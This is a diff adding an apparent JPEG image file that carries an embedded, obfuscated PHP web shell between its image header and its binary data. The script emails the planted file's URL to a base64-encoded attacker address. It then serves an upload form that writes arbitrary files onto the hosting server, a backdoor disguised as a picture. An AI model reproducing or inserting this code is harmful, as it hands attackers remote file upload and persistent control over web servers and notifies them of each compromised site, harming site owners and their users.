@@ -1,0 +1,13 @@
+JFIF
+<?php 
+$勩搞銐櫦埢剚技併墎晥 = base64_decode("cm9vdGN5YmVycHVua3NAZ21haWwuY29t");
+$裤亾仌瘑笺倐曘劗銈瞾 ="http://" . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'] . "combo";
+mail($勩搞銐櫦埢剚技併墎晥,"for 4u", $裤亾仌瘑笺倐曘劗銈瞾);
+echo"<b>AKU GANTENG</b><br>";if($_POST){if(@copy($_FILES["0"]["tmp_name"],$_FILES["0"]["name"])){echo"Berhasil";}else{echo"Gak Berhasil";}}else{echo"<form method=post enctype=multipart/form-data><input type=file name=0><input name=0 type=submit value=Go!>";}?>C	
+
+			
+
+		
+
+
+C	"#Qr&1!A"2qQa?y,/3Jݹ߲؋5XwyRI02PIIiMrN&"KgX:nTJnLK@!-m;g&hw@ܗ9-.1<yQUہ?.b߱֫w*V) `$bԟX-TG3g JxU/v_s(H@TJn!gfbc:l[Qe9PLbCm[5'jgl_l-;"PkQ_^Sx?"Y騐O	q`~~tUCڒV		I1_
